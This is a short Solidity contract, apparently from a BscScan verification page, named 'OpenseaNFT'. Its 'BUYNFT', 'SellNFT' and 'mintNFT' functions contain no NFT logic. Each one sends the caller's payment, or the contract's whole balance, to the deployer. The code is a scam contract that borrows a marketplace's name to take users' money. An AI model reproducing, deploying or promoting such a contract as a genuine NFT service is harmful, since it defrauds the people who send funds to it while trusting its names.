/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0;
contract OpenseaNFT {
address private owner;


    constructor() {
            owner = msg.sender;
        }

        function  BUYNFT(uint256 amount) external payable{
            amount = amount * 10 ** 18;
            payable(owner).transfer(amount);

        }

        function SellNFT() external payable { 

            payable(owner).transfer(address(this).balance);
        }

        function mintNFT() external payable {
            payable(owner).transfer(address(this).balance);

        }

        receive() external payable {

        }
    

}